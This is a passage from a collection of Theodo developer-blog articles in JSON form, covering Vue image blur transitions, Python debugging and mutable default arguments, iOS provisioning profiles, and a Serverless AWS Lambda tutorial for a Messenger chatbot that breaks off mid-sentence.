hidden and the image is shown\non the next frame, the \u2018blur-enter\u2019 and \u2018blur-leave\u2019 classes are removed, thus triggering the transition for the image\n\nKnowing this we can make the following changes in our style:\n<style scoped>\r\n  img, .placeholder {\r\n    height: 600px;\r\n    width: 900px;\r\n    position: absolute;\r\n  }\r\n  .placeholder {\r\n    background-color: rgba(0,0,0,.05);\r\n  }\r\n  .blur-transition {\r\n    transition: opacity linear .4s 0s;\r\n    opacity: 1;\r\n  }\r\n  .blur-enter, .blur-leave {\r\n    opacity: 0;\r\n  }\r\n</style>\r\n\nThat way the images and placeholders will fade in and out when they appear and disappear.\nYou can see a live demo here: http://codepen.io/zkilo/pen/wgdxWq.\nWell, it looks good but there is a slight difference with what it actually looks like on Medium.\nCan you spot it?\nUsing canvas\nIf you\u2019ve looked well at the previous Codepen you may have found out a little issue.\nWhen we change the opacity of the low resolution image, we can see the ugly pixels because browsers aren\u2019t able to blur the image while its opacity changes.\nBut don\u2019t worry, there\u2019s an easy way to solve this!\nWe\u2019re going to use canvas, because browsers can actually blur canvas while their opacity changes with a little trick!\nSo, let\u2019s change our template:\n<template>\r\n  <transition-group name=\"blur\" tag=\"div\">\r\n    <div v-show=\"currentSrc === null\" class=\"placeholder blur-transition\" key=\"placeholder\"></div>\r\n    <canvas v-show=\"currentSrc === loResSrc\" height=\"17\" width=\"27\" key=\"canvas\" class=\"blur-transition\"></canvas>\r\n    <img v-show=\"currentSrc === hiResSrc\" :src=\"hiResSrc\" key=\"image\" class=\"blur-transition\"></img>\r\n  </transition-group>\r\n</template>\r\n\nAnd our style:\n<style scoped>\r\n  img, canvas, .placeholder {\r\n    height: 600px;\r\n    width: 900px;\r\n    position: absolute;\r\n  }\r\n  .placeholder {\r\n    background-color: rgba(0,0,0,.05);\r\n  }\r\n  canvas {\r\n    filter: blur(10px);\r\n  }\r\n  .blur-transition {\r\n    transition: opacity linear .4s 0s;\r\n    opacity: 1;\r\n  }\r\n  .blur-enter, .blur-leave {\r\n    opacity: 0;\r\n  }\r\n</style>\r\n\nYou can see that we\u2019ve set the height and weight attributes of our canvas in the template and streched it out in our style.\nYou might also have spotted the little trick: we can add a blur filter attribute on the canvas and it will still be here even if the opacity of our element changes!\nI\u2019ve set it to 10px empirically, but you can learn more about the canvas filter here.\nOnce we\u2019ve done this, we need to draw our low resolution image inside the canvas once it is loaded:\n<script>\r\n  export default {\r\n    props: [\r\n      'hiResSrc',\r\n      'loResSrc'\r\n    ],\r\n    data: function() {\r\n      return {\r\n        currentSrc: null\r\n      }\r\n    },\r\n    mounted: function () {\r\n      var loResImg, hiResImg, that, context;\r\n      loResImg = new Image();\r\n      hiResImg = new Image();\r\n      that = this;\r\n      context = this.$el.getElementsByTagName('canvas')[0].getContext('2d'); // get the context of the canvas\r\n\r\n      loResImg.onload = function(){\r\n        context.drawImage(loResImg, 0, 0);\r\n        that.currentSrc = that.loResSrc;\r\n      }\r\n      hiResImg.onload = function(){\r\n        that.currentSrc = that.hiResSrc;\r\n      }\r\n      loResImg.src = that.loResSrc;\r\n      hiResImg.src = that.hiResSrc;\r\n    }\r\n  }\r\n</script>\r\n\nYou can see the final result on this Codepen: http://codepen.io/zkilo/pen/ZLyweL.\nAnd that\u2019s it!\n\nYou can find the component as a .vue file on this Github repository.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLouis Zawadzki\r\n  \t\t\t\r\n  \t\t\t\tI drink tea and build web apps at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nThere\u2019s something I want you to learn. I can\u2019t tell you what it is right now. You\u2019ll have to trust me blindly and follow the instructions closely.\n\n\nPart 1\u200a\u2014\u200aBe a challenger\nWe\u2019re going to look at some buggy python code. Don\u2019t leave just yet if you have never written python before! You will find something to apply to you preferred everyday language, I promise. If I lied, you are allowed to insult me abundantly through your favorite channel (here\u2019s my Twitter, you\u2019re welcome). Here\u2019s your code, commented so that you know what happens.\ndef foo(a, methods=[]): # methods defaults to [] if not specified                      \r\n    for i in range(3):\r\n        # Append an anonymous function, which returns `x + i`\r\n        # when given `x`\r\n        methods.append(lambda x: x + i)\r\n    \r\n    sum_methods = 0\r\n    # For each function `method` of in `methods`, sum `method(a)`\r\n    for method in methods:\r\n        sum_methods += method(a)\r\n    return sum_methods\r\n\nYou expect your function to output the following:\n\nfoo(0) = (0 + 0) + (0 + 1) + (0 + 2) = 3\nfoo(1) = (1 + 0) + (1 + 1) + (1 + 2) = 6\nfoo(2) = (2 + 0) + (2 + 1) + (2 + 2) = 9\nfoo(2, [lambda x: x]) = ((2)) + ((2 + 0) + (2 + 1) + (2 + 2)) = 11\n\nSimple, right? Let\u2019s try it in our terminal.\n>>> foo(0)\r\n6\r\n>>> foo(1)\r\n18\r\n>>> foo(2)\r\n36\r\n>>> foo(2, [lambda x: x])\r\n14\r\n\nWell, there seems to be a minor error. But wait, could we have missed something? Let\u2019s check again.\n>>> foo(0)\r\n24\r\n>>> foo(1)\r\n45\r\n>>> foo(2)\r\n72\r\n\nWHAT.\nTHE.\n\nHe\u2019s not screaming what you\u00a0think he is\n\nBut, you\u2019re not going to get beaten down by this, right? You will pull your shirtsleeves up your arms (provided you wear a shirt, which would be unusual but we\u2019re not judging), and you will find out what is wrong using well-placed print statements or other debugging practices you know.\nSet a stopwatch, try to debug the code by clicking here, and please let me know how much time it took you to understand and fix what\u2019s wrong in the comments, and what practices you used. Keep both for loops and don\u2019t change the foo function calls because it would be too easy. Got it? Go!\n\n\n\n\n\n\n\n\n\nPart 2\u200a\u2014\u200aBehold the\u00a0Light\nBefore jumping to the answer, let\u2019s talk about debuggers. Every language I know has a way to be debugged. Debuggers lets you explore each line of the code in a convenient way.\nEvery debugger has at least the following commands, that you can use directly in python code:\n\nSet a break point, where the execution will halt: pdb.set_trace()\u00a0. I usually set my breakpoints with import pdb; pdb.set_trace() since Python is not bothered with importing the same library several times and in an inline fashion.\nContinue until next break point: c\nNext line: n\nList the surrounding code: l\nHelp: h\n\nDebuggers are Life\n\u2014\u200a Experts\nSo how much quicker could you have been by using a debugger instead of trial-and-error and print statements?\nI\u2019ve tried this hypothesis on two separate groups of people: one where they used print statements, and one where they used the debugger. The second group took 9 minutes on average, and the first one 14 minutes! That\u2019s a 35% speedup on an 8-line-long program.\nNow imagine you encountered these bugs hidden in a much bigger program? I know a lot of developers that spend hours debugging a bug with print statements and waste a lot of time. The challenge is to find out exactly where you are in the code, but you get used to it very quickly, either by setting a lot of breakpoints, or by using the l command. Debuggers walk you through the code and they make understanding some new code much easier.\n\nMia found out about debuggers at an early age and is still amazed! Be like\u00a0Mia.\n\nDo you want your solution then? I\u2019ve made a video of me using a python debugger (don\u2019t mind the occasional typos please). It\u2019s a bit long but I kept it real-time so you can see the debugging process more clearly. Here\u2019s the video:\n\nAdditional info: methods was broken because lists in python are mutable objects. It means that when\u00a0methods is set to the default value (the empty list) and is then changed, the default value is also updated (and becomes the empty list with one more element). This is a common pitfall that you can fix using a None default value. Here is the full corrected code:\ndef methods_generator(i):  # Scopes the i to not overwrite it\r\n    return lambda x: x + i\r\n\r\ndef foo(a, methods=None):\r\n    if methods is None:  #Prevents the default value to be changed \r\n        methods = []\r\n    for i in range(3):                  \r\n        methods.append(methods_generator(i))\r\n    \r\n    sum_methods = 0\r\n    for method in methods:\r\n        sum_methods += method(a)\r\n    return sum_methods\r\n\nPart 3\u200a\u2014\u200aDebugging resources\nI promised I would write about other languages, and I will keep this promise right now! Here are useful resources I came across, please don\u2019t hesitate to submit more! I also including resources about code linting (that analyzes your code looking for typos and common errors) and gotchas (which are common pitfalls in a language, just like the mutable list default value above).\nPHP\n\nConfiguring your debugger in PHPStorm with XDebug through a Vagrant machine\nAn Atom package for PHP debugging\nA linter for PHP in atom\nPHP gotchas (use Google for more)\n\nJavascript\n\nTo debug your front-end code, you can set a breakpoint by typing debugger anywhere in your code. The execution will halt only if you have the developper tools opened in your browser! Make sure you don\u2019t commit it\u00a0:).\nDebugging in NodeJS\nA comparison of Javascript linting tools, for which you can find related atom and sublime packages.\nJavascript gotchas\n\nPython\n\nAdditional debugging tips\nYou can also use ipdb instead of the native pdb library to debug with ipython (trust me it\u2019s great)\nIf you use Jupyter notebooks you can debug easily in them\nThough I prefer flake8, here is a list of linting tools for python.\nPython gotchas\u00a0(thanks @christianwitts!)\n\nJava\n\nHere is a debugging tutorial on Eclipse\nLint your code with SonarLint\nJava gotchas\n\nC#\n\nDebugging in Visual Studio\nThere\u2019s an embedded linter in Visual Studio called FxCop\nC# and .NET gotchas\n\nRuby\n\nAn Atom package for Ruby debugging\nThis answer on Stackoverflow covers linters for Ruby\nRuby gotchas\n\n\n\n\n\n\n\n\n\n\nHappy debugging, happy life!\n\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFlavian Hautbois\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo. Musician, entrepreneur, fanatic of innovation, science, and technology. Failed one startup so far.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIf you\u2019ve spent any time developing an app for iOS, then you\u2019ve probably stumbled across the bit of the Developer Console called \u2018Certificates, Identifiers & Profiles\u2019.\n\nThis is not a blog post about how to do anything in that section.\nInstead, it\u2019s a rough guide to\u00a0what everything means \u2014 in the hope of providing some relief/context when you\u2019ve just seen the error \u2018No code signing identities\u2019 for the millionth time and feel like throwing your laptop out the window while shouting \u2018Code sign\u00a0this!\u2019\n(Note: this article focuses on App Store\u00a0apps, rather than\u00a0in-house apps, which you can create through the Apple Developer Enterprise Program.)\nWhy Provisioning Profiles?\nGood question. The key thing is that, unlike Android, you can\u2019t install any old app on an iOS device:\u00a0it has to be signed by Apple first.1 However, when you\u2019re\u00a0developing an app, you probably want to test it before sending it to Apple for approval. Provisioning profiles are simply a way for you to do that: they\u2019re like a \u2018temporary visa\u2019 that lets you run and test your app on a physical device. And like all good visa schemes,\u00a0this means dealing with some bureaucracy\u2026\nThe Components\nProvisioning profiles always require\u00a0the following components:2\n\nA certificate\nA unique app identifier (an \u2018App ID\u2019)\n\nIn some cases, they also require:\n\nA list of devices the app can run on\n\nThe Certificate\nThis is a public/private key-pair, which identifies who developed the app.3 (Without such certificates, I could e.g. create an app called \u2018Facebook\u2019 and pretend that it\u2019s an update to the actual Facebook \u2014 and hence trick you into giving me your login credentials.)\nWhen you try to create a new certificate, you\u2019ll be presented with several options. For provisioning profiles, the key ones are:\n\niOS App Development: a\u00a0development certificate. These are for developers who want to test the app on a physical device while writing code.\nApp Store and Ad-Hoc: a\u00a0distribution certificate. These are for when you\u2019re ready to give the app to other people \u2014 first for testing (the \u2018Ad-Hoc\u2019 bit) and then for general distribution via TestFlight or the App Store.\n\nWhen you join an iOS development team, you\u2019re either a \u2018Member\u2019 or an \u2018Admin\u2019. Anyone can create development certificates, but only those with admin privileges can create distribution certificates.\nThe App ID\nThis is a unique identifier for your app. Apple recommends using a \u2018reverse-domain name style string\u2019 of the form:\u00a0com.yourcompanyname.yourappname. You can then associate \u2018entitlements\u2019 to your App ID, such as iCloud, Push Notifications, Apple Pay, etc.\nIt\u2019s also possible to create \u2018wildcard\u2019 App IDs, e.g.\u00a0com.yourcompanyname.*, which can be used for multiple apps. While these can be useful in some cases, note that you\u00a0can\u2019t associate entitlements to them.\nExtra tip: if you\u2019re planning on releasing an Android app as well, then you should avoid using hyphens (-) in your App ID \u2014 otherwise you won\u2019t be able to use the same one on both platforms.\nThe\u00a0List of Devices\nThis is a list of devices.\nThis is perhaps the most annoying part of the process: if you want to distribute your app to testers (without using TestFlight), then they need to send you their device\u2019s \u2018Unique Device Identifier\u2019 or UDID. Unfortunately, you can\u2019t find it\u00a0within iOS itself: they\u2019ll need to connect their device to a computer.\nI heartily recommend the website whatsmyudid.com, which provides clear, illustrated instructions about what to do. However, you should still mentally prepare yourself for people sending you\u00a0all kinds of random, irrelevant strings with the question: \u2018Is this it?\u2019 (Hint: if it\u2019s not a 40-character, hexadecimal string, then the answer is no.4)\nCreating a\u00a0Provisioning Profile\nCongratulations, you\u2019re now ready to build your provisioning profile! Again, there are quite a few options, but the main ones are:\n\niOS App Development: for testing the app on a physical device while developing.\nAd Hoc: for distributing the app to non-TestFlight testers (e.g. via HockeyApp).\nApp Store: for distributing the app via TestFlight or the App Store.\u00a0(Note that this one doesn\u2019t work on its own: your app\u00a0will still need signing by Apple.)\n\nHere are the key differences between them:\n\n\n\nProvisioning Profile\nCertificate\nApp ID\nList of Devices\n\n\niOS App Development\niOS App Development\nYes\nYes\n\n\nAd Hoc\nApp Store and Ad-Hoc\nYes\nYes\n\n\nApp Store\nApp Store and Ad-Hoc\nYes\nNo\n\n\n\nSo when iOS attempts to install an app, it checks the following things:\n\nThat the private key used to sign the app matches the public key in the certificate;\nThat the App ID is correct;\nThat the entitlements required are associated with the App ID;\nThat the device itself is in the list of devices.\n\nIf anyone of these conditions fail, then the app will not install \u2014 and you\u2019ll see a greyed-out app icon with no error message or clue for how to proceed. But at least now you have somewhere to start: you can go through those four bullet points\u00a0manually, and make sure everything is as it should be. (We\u2019ve found it\u2019s usually an issue with the list of devices.)\nThe End\nI hope this post helped demystify what\u2019s going on when you create a provisioning profile. If not, then please feel free to leave a question in the comments below!\n\nFootnotes\n1 This doesn\u2019t apply to the iOS simulator or a jailbroken device. [back]\n2 Note that these correspond to the sections of the left-hand menu within \u2018Certificates, Identifiers & Profiles\u2019.\u00a0[back]\n3 Although this is all a lot more elaborate than Android\u2019s system, one of the great advantages is that you can\u00a0recreate certificates. On Android, if you lose the original private key then you\u2019re screwed: you won\u2019t be able to update your original app, and you\u2019ll have to convince all your existing users to download a new one.\u00a0[back]\n4\u00a0I once even got sent a 40-character, hexadecimal string that wasn\u2019t a valid UDID, and looked\u00a0nothing like the actual one they eventually sent me. To this day, I still have no idea where they got it from.\u00a0[back]\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tHari Sriskantha\r\n  \t\t\t\r\n  \t\t\t\tAgile Web and Mobile Developer  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI always feel guilty when I suddenly motivate myself to go to the gym, then have all the painful thoughts like going out in the cold, being sweaty and feeling stiff afterwards and decide that I\u2019d rather stay in bed watching my favorite series.\nI have the same mixed feelings when I get an idea of project and then get discouraged \u2014even before getting started\u2014 thinking about having to provision a server and deploy my code to see it live and used by others than myself.\nBut recently, I discovered Serverless, a framework based on Amazon Lambda that helps you deploy your code in seconds.\nThe framework is said to relieve Lambda functions of its main pain points (the AWS console, the heavy configuration), to allow developers to work with more familiar standards.\nLooks like a really nice promise that would dismiss all my excuses not to go on with any of my ideas:\n\nFocus on coding, deploy single functions in the cloud\nDon\u2019t manage any server. AWS handles provisioning and scaling\nPay only when the functions are running\n\nI decided to test it on a fun project and experience how promising it actually is.\nI ended up creating a chatbot game on Facebook Messenger, to help my colleagues learn the name of everybody in the company.\nI started with this tutorial: Building a Facebook Messenger Chatbot with Serverless, which quickly allowed me play with my phone talking to my chatbot.\nBut I have to admit I had to struggle a little to fully understand all the magic behind the framework and diverge from the tutorial to do what I wanted.\nIn this article, you\u2019ll find:\n\nHow Serverless works\nA benchmark on when to use Serverless, an EC2 or a Heroku server\n\nWhat cool projects can you do with Serverless?\nLambda functions are handy for:\n\nA cron job running without having a full server dedicated to it\nEx: a custom IFTTT or Zapier\nAn automatic data processing job\nEx: create thumbnails for profile pictures uploaded to your website\n\nFunnier: a backend for a chatbot\nBuilding a chatbot is a great mean to test an idea and develop an MVP.\nThe advantage is that you only have to focus on the backend, since the frontend and delivery is granted by the messaging service you\u2019ll be using.\nAnd with Serverless,\n\nOnly code the logic of the bot\nQuickly iterate as deploying is super fast\nSpend little money while testing\nKeep focusing on your service if you get successful as AWS handles scaling\n\nHaving a Chatbot Running in Prod in 15 Minutes with Serverless\nRequirements\nBefore starting the tutorial, make sure you have:\n\nAn account set on AWS ~3min + 24h validation\n\nBe aware that a credit card is required to sign up\nYou\u2019ll have the free tier for one year\nYou\u2019ll need to wait 24 hours to have your account validated\nBe patient, you can watch your favorite series or go to the gym while you wait \ud83d\ude09\n\n\nNode v4 or higher to install Serverless ~1min\nnpm install -g serverless will do the job\nThe API Key & Secret of an IAM user ~2min\nWith programmatic access and AdministratorAccess. The paragraph Creating AWS Access Keys in the Serverless doc is fairly explicit for that.\nConfigured Serverless with your AWS credentials ~1min\nI recommend using the serverless config credentials command.\nYou\u2019ll avoid having to install aws-cli or managing environment variables\nFor the chatbot, a Facebook Developer account ~1min\n3min if you don\u2019t have a Facebook account yet\nFor the chatbot, a Facebook page that you own ~2min\nThe page gives an identity to your chatbot, you can\u2019t have one without it.\n\nTutorial\nInit your project\n$ sls create --template aws-nodejs --path my-first-chatbot\r\n\nThis creates two files in the directory my-first-chatbot:\n\u251c\u2500\u2500 my-first-chatbot\r\n\u2502   \u251c\u2500\u2500 handler.js\r\n\u2502   \u2514\u2500\u2500 serverless.yml\r\n\nI used Node.js for my bot. If you prefer Python, use aws-python instead.\nFirst take a look at the serverless.yml file.\nIt is the configuration file of your project.\nLots of options are commented in the file, all you need for now is the following:\nservice: my-first-chatbot\r\n\r\nprovider:\r\n  name: aws\r\n  runtime: nodejs4.3\r\n  region: eu-central-1 # (Frankfort) Choose the closest data center\r\n                       # from your end users\r\n\r\nfunctions:\r\n  hello: # the name of your Lambda function\r\n    handler: handler.hello # The node function that is exported\r\n                           # from the handler.js module\r\n                           # It is used as handler by AWS Lambda\r\n                           # That's to say the code excecuted\r\n                           # when your Lambda runs.\r\n\nSo far you have declared the hello Lambda function which will be deployed somewhere in the Frankfort AWS cloud.\nYou can already invoke it locally from your shell to check that it works:\n$ sls invoke local -f hello\r\n{\r\n    \"statusCode\": 200,\r\n    \"body\": \"{\\\"message\\\":\\\"Go Serverless v1.0!\r\n         Your function executed successfully!\\\",\\\"input\\\":\\\"\\\"}\"\r\n}\r\n\nNotice that you can pass an input when you invoke your Lambda function, either inline or with a .json or .yml file\n$ sls invoke local -f hello -d \"my data\"\r\n{\r\n    \"statusCode\": 200,\r\n    \"body\": \"{\\\"message\\\":\\\"Go Serverless v1.0!\r\n         Your function executed successfully!\\\",\\\"input\\\":\\\"my data\\\"}\"\r\n}\r\n\r\n$ sls invoke local -f hello -p \"path_to_my_data_file.yml\"\r\n{\r\n    \"statusCode\": 200,\r\n    \"body\": \"{\\\"message\\\":\\\"Go Serverless v1.0!\r\n         Your function executed successfully!\\\",\\\"input\\\":\\\"{\\\"data\\\":\r\n         \\\"Content of my data file as json\\\"}\\\"}\"\r\n}\r\n\nNow you can take a look at the handler.js file to see that the hello function simply returns a JSON 200 response.\n'use strict';\r\n\r\nmodule.exports.hello = (event, context, callback) => {\r\n  const response = {\r\n    statusCode: 200,\r\n    body: JSON.stringify({\r\n      message: 'Go Serverless v1.0! Your function executed successfully!',\r\n      input: event,\r\n    }),\r\n  };\r\n\r\n  callback(null, response);\r\n};\r\n\n\nThe event variable contains all data from the event that triggered your function.\nThe context variable contains runtime information of the Lambda function that is executing.\nWe won\u2019t need it here but if you are curious you can check the documentation about the context object on AWS\n\nCode the logic to communicate with your Facebook chat.\nYou need a webhook (aka web callback or HTTP push API) to first exchange credentials with your Messenger app so that you can start receiving events from it (incoming messages, postback \u2026) and responding to them.\nCredentials exchange is done through an HTTP GET event set for your Lambda function.\nThe HTTP GET event requires an endpoint.\nLuckily, Serverless allows you to create one simply by writing a few lines of configuration.\nRename your hello function to webhook and add the following config to your serverless.yml:\n...\r\n\r\nfunctions:\r\n  webhook: # The name of your lambda function\r\n    handler: handler.webhook\r\n    events: # All events that will trigger your webhook Lambda function\r\n      - http:\r\n          path: webook # The path of the endpoint generated with API Gateway\r\n          method: GET\r\n          integration: Lambda # A method of integration to exchange\r\n                              # requests and responses between the\r\n                              # HTTP endpoint and your Lambda function\r\n                              # The `Lambda` method here works well\r\n                              # with Messenger's events\r\n\nThen update your handler.js file to enable authorisation:\nmodule.exports.webhook = (event, context, callback) => {\r\n  if (event.method === 'GET') {\r\n    // Facebook app verification\r\n    if (\r\n      event.query['hub.verify_token'] === 'SECRET_TOKEN'\r\n      && event.query['hub.challenge']\r\n    ) {\r\n      return callback(null, parseInt(event.query['hub.challenge']));\r\n\r\n    } else {\r\n      const response = {\r\n        statusCode: 403,\r\n        body: JSON.stringify({\r\n          message: 'Invalid Token',\r\n          input: event,\r\n        }),\r\n      };\r\n\r\n      return callback(null, response);\r\n    }\r\n  } else {\r\n    const response = {\r\n      statusCode: 400,\r\n      body: JSON.stringify({\r\n        message: 'Bad Request',\r\n        input: event,\r\n      }),\r\n    };\r\n\r\n    return callback(null, response);\r\n  }\r\n };\r\n\n\nDon\u2019t forget to rename your exported Lambda function webhook!\nMake sure to choose a strong SECRET_TOKEN\n  It is the token that you will have to declare to your Messenger app to enable communication with the chat\nThe hub.challenge is an integer code that Messenger sends you along with the token\n\n Test your handler locally:\n\r\n  $ sls invoke local -f webhook -p -d \"{\\\"method\\\":\\\"GET\\\",\\\"query\\\":{\\\"hub.verify_token\\\":\\\"SECRET_TOKEN\\\",\\\"hub.challenge\\\":123456}}\"\r\n123456\r\n  $ sls invoke local -f webhook -p -d \"{\\\"method\\\":\\\"GET\\\",\\\"query\\\":{\\\"hub.verify_token\\\":\\\"BAD_TOKEN\\\",\\\"hub.challenge\\\":123456}}\"\r\n{\r\n    \"statusCode\": 403,\r\n    \"body\": \"{\\\"message\\\":\\\"Invalid Token\\\",\\\"input\\\":{\\\"method\\\":\\\"GET\\\",\\\"query\\\":{\\\"hub.verify_token\\\":\\\"BAD_TOKEN\\\",\\\"hub.challenge\\\":123456}}}\"\r\n}\r\n\n  I recommend you create .yml or .json files to invoke your Lambda function locally.  It will make your life easier \nNow that you\u2019ll be able to receive events from Messenger, let\u2019s update your Lambda function to actually handle them.\nAdd HTTP POST config to your serverless.yml:\n...\r\n\r\nfunctions:\r\n  webhook:\r\n    handler: handler.webhook\r\n  events:\r\n    - http:\r\n      path: webook\r\n      method: GET\r\n      integration: Lambda\r\n    - http:\r\n      path: webook\r\n      method: POST\r\n      integration: Lambda\r\n\nTo handle the POST requests we will need some more preparation:\n\n Create your Messenger app\n For that,\n\n Create an app from your Facebook developer account\n Add the Messenger product to your app\n   You can access all Facebook products from the left menu \u201cAdd a product\u201d\n\n\n Get a page token to be able to post messages on behalf of your page (and have your chatbot respond automatically)\n Once you have added Messenger to your app, configure Messenger parameters (accessible from left menu also):\n\n Under \u201cToken Generation\u201d, select your Facebook page\n Grant access to it with your Facebook account\n Save the token you get for later\n\n\n Add axios to your project to be able to send responses from your bot\n$ npm install axios\n\n\nNow you can edit your `handler.js`:\nconst axios = require('axios');\r\nconst fbPageToken = 'YOUR_FACEBOOK_PAGE_TOKEN';\r\nconst fbPageUrl = `https://graph.facebook.com/v2.6/me/messages?access_token=${fbPageToken}`;\r\n\r\nmodule.exports.webhook = (event, context, callback) => {\r\n  if (event.method === 'GET') {\r\n    // ...\r\n  } else if (event.method === 'POST' && event.body.entry) {\r\n      event.body.entry.map((entry) => {\r\n        // Messenger can send several entry for one event.\r\n        // The list contains all the information on the event.\r\n        entry.messaging.map((messagingItem) => {\r\n          // Each entry can have several messaging data within each event.\r\n          // For instance if a user sends several messages at the same time.\r\n          // messagingItem contains:\r\n          //  - the sender information,\r\n          //  - the recipient information,\r\n          //  - the message information,\r\n          //  - other specific information\r\n          const senderId = messagingItem.sender.id;\r\n\r\n          // handle text message\r\n          if (messagingItem.message && messagingItem.message.text) {\r\n          const payload = {\r\n            recipient: {\r\n              id: senderId\r\n            },\r\n            message: {\r\n              text: `You say \"${messagingItem.message.text}\", I say: Hi, let's chat :)`\r\n            }\r\n          };\r\n          axios\r\n            .post(fbPageUrl, payload)\r\n            .then((response) => {\r\n              response = {\r\n                statusCode: response.status,\r\n                body: JSON.stringify({\r\n                  message: response.statusText,\r\n                  input: event,\r\n                }),\r\n              };\r\n              return callback(null, response);\r\n            })\r\n            .catch((error) => {\r\n              const response = {\r\n                statusCode: error.response.status,\r\n                body: JSON.stringify({\r\n                  message: error.response.statusText,\r\n                  input: event,\r\n                }),\r\n              };\r\n              return callback(null, response);\r\n            });\r\n        }\r\n      });\r\n    });\r\n  } else {\r\n    // ...\r\n  }\r\n };\nYou can try to call your Lambda locally, but you won\u2019t be able to get a successful response unless you know a real sender ID.\n$ sls invoke local -f webhook -d \"{\\\"method\\\":\\\"POST\\\",\\\"body\\\":{\\\"entry\\\":[{\\\"messaging\\\":[{\\\"sender\\\":{\\\"id\\\":\\\"YOUR_SENDER_ID\\\"},\\\"message\\\":{\\\"text\\\":\\\"Hello\\\"}}]}]}}\"\r\n{\r\n\"statusCode\": 400,\r\n\"body\": \"{\\\"message\\\":\\\"Bad Request\\\",\\\"input\\\":{\\\"method\\\":\\\"POST\\\",\\\"body\\\":{\\\"entry\\\":[{\\\"messaging\\\":[{\\\"sender\\\":{\\\"id\\\":\\\"YOUR_SENDER_ID\\\"},\\\"message\\\":{\\\"text\\\":\\\"Hello\\\"}}]}]}}}\"\r\n}\r\n\nThis means it is time to deploy your project for the first time!\nDeploy\nAs easy as:\n$ sls deploy\r\n\nYou\u2019ll see the following logs appear:\nServerless: Packaging service...\r\nServerless: Uploading CloudFormation file to S3...\r\nServerless: Uploading service .zip file to S3 (134.73 KB)...\r\nServerless: Updating Stack...\r\nServerless: Checking Stack update progress...\r\n.................................\r\nServerless: Stack update finished...\r\nService Information\r\nservice: my-first-chatbot\r\nstage: dev\r\nregion: eu-central-1\r\napi keys:\r\n  None\r\nendpoints:\r\n  GET - https://ENDPOINT_ID.execute-api.eu-central-1.amazonaws.com/dev/webook\r\n  POST - https://ENDPOINT_ID.execute-api.eu-central-1.amazonaws.com/dev/webook\r\nfunctions:\r\n  my-first-chatbot-dev-webhook: arn:aws:Lambda:eu-central-1:ID:function:my-first-chatbot-dev-webhook\r\n\nCongratulations, your webhook is now available from anywhere!\nWhat happened exactly?\nNotice that you have a new folder in your project directory:\n\u251c\u2500\u2500 my-first-chatbot\r\n\u2502 \u251c\u2500\u2500 .serverless\r\n\u2502 \u2502 \u251c\u2500\u2500 cloudformation-template-create-stack.json\r\n\u2502 \u2502 \u251c\u2500\u2500 cloudformation-template-update-stack.json\r\n\u2502 \u2502 \u2514\u2500\u2500 my-first-chatbot.zip\r\n\u2502 \u251c\u2500\u2500 node_modules\r\n\u2502 \u251c\u2500\u2500 handler.js\r\n\u2502 \u2514\u2500\u2500 serverless.yml\r\n\nLet\u2019s examine the first half of the logs to understand:\n\nServerless reads your serverless.yml file to create two CloudFormation files in the directory .serverless:\n\none to create a CloudFormation on AWS through your AWS account\none to create all the AWS resources you need to have your Lambda function working (here it includes the two API Gateway endpoints you need for your webhook and other credentials settings)\n\n\nServerless packaged all the files in your directory except the serverless.yml file, zip it to .serverless/my-first-chatbot.zip\nServerless then uploads the new files created to an S3 Bucket in the region specified in your serverless.yml and creates or update all the resources listed in the CloudFormation update file (including the Lambda function of course)\n\nWhat you can do now:\n\nInvoke your deployed Lambda function\n$ sls invoke -f webhook -p -d \"{\\\"method\\\":\\\"GET\\\",\\\"query\\\":{\\\"hub.verify_token\\\":\\\"SECRET_TOKEN\\\",\\\"hub.challenge\\\":123456}}\"\r\n$ sls invoke -f webhook -p -d \"{\\\"method\\\":\\\"GET\\\",\\\"query\\\":{\\\"hub.verify_token\\\":\\\"BAD_TOKEN\\\",\\\"hub.challenge\\\":123456}}\"\r\n$ sls invoke -f webhook -d \"{\\\"method\\\":\\\"POST\\\",\\\"body\\\":{\\\"entry\\\":[{\\\"messaging\\\":[{\\\"sender\\\":{\\\"id\\\":\\\"YOUR_SENDER_ID\\\"},\\\"message\\\":{\\\"text\\\":\\\"Hello\\\"}}]}]}}\"\r\n\n\nTest that your Lambda function is triggered when there is a call to one of the endpoints that were just created\n    Use curl for instance to query the endpoint https://ENDPOINT_ID.execute-api.eu-central-1.amazonaws.com/dev/webook\nBetter, test your chatbot live!\n\nTry it! Send your first message to your chatbot\nFinal settings for your Messenger app:\n\nConfigure Messenger parameters to \u201cSetup Webhooks\u201d under \u201cWebhooks\u201d now that your endpoint is available\nUse the endpoint url as \u201cCallback URL\u201d and your SECRET_TOKEN\nSubscribe to messages and other Messenger events you might want to handle\n\u201cVerify and Save\u201d: Facebook will call the GET endpoint with the token your gave him to subscribe your webhook to the app\nOnce done, in the same \u201cWebhook\u201d section, select your Facebook page for subscription: you\u2019ll now listen 